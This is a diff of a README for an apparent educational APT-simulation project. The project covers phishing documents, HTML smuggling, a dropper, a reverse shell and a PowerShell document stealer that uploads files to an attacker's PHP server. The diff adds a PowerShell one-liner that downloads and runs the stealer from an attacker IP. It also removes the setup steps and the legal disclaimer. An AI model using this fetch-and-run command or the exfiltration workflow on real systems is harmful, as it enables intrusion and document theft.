@@ -22,8 +22,14 @@ This project simulates an **Advanced Persistent Threat (APT)** attack, covering 
 
 ### **4. Data Exfiltration (Document Theft)**
 
-- A **PowerShell document stealer** (docs-stealer.ps1) searches for sensitive files (**.txt, .pdf, .xlsx, .csv**) etc.
-- Stolen files are uploaded to a **remote PHP web server** controlled by the attacker.
+- A **PowerShell document stealer** (`docs-stealer.ps1`) searches for sensitive files such as **.txt, .pdf, .xlsx, .csv**, and other document types.
+- Once the attacker gains a **reverse shell** on the target system, they execute the following command to download and run the document stealer:
+
+  ```powershell
+  powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://<attacker_ip>/docs-stealer.ps1')"
+  ```
+
+- The script scans for potential sensitive documents and uploads them to a **remote PHP web server** controlled by the attacker.
 
 ## **Components**
 
@@ -33,32 +39,3 @@ This project simulates an **Advanced Persistent Threat (APT)** attack, covering 
 - **PHP Web Server**: Receives stolen files.
 - **HTML Smuggling (HTML & JavaScript)**: dropper delivery.
 - **Phishing Document (DOCX)**: Social engineering bait.
-
-## **How to Set Up the Simulation**
-
-### **1. Configure Virtual Environment**
-
-- Use **VirtualBox** with a **Windows VM** as the target.
-- Set up an **attacker machine (Kali Linux/Ubuntu)** for control.
-
-### **2. Start the Web Server**
-
-```bash
-php -S 0.0.0.0:8080 -t /path/to/upload_server/
-```
-
-### **3. Send the Phishing Document**
-
-- Distribute the **malicious job description (.docx)** via email or messaging platforms.
-
-### **4. Monitor the Attack Progress**
-
-- Wait for the victim to execute **dropper.exe**.
-- Capture the **reverse shell connection**.
-- Extract stolen data from the PHP web server.
-
-## **Disclaimer**
-
-This project is strictly for **educational purposes**. Unauthorized use of these techniques on real systems **without permission** is illegal and may result in serious legal consequences. Use this simulation in a controlled and isolated environment only.
-
----
